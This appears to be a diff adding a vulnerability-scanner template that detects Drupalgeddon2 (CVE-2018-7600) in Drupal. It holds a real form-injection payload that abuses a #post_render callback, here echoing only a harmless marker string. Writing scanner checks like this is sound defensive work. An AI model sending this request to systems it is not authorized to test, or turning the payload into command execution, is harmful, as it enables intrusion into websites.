@@ -1,0 +1,28 @@
+id: drupalgeddon2-rce
+info:
+  name: Drupal Core Form API Remote Code Execution (Drupalgeddon2 - CVE-2018-7600)
+  author: phantomscan
+  severity: critical
+  description: Unauthenticated remote code execution vulnerability in Drupal 7.x and 8.x due to insufficient input validation on the Form API AJAX requests.
+  tags: cve,rce,drupal,critical
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2018-7600
+  metadata:
+    cve-id: CVE-2018-7600
+    cvss-score: 9.8
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=printf&mail%5B%23type%5D=markup&mail%5B%23markup%5D=drupalgeddon2_cve_2018_7600_check"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "drupalgeddon2_cve_2018_7600_check"
+        part: body
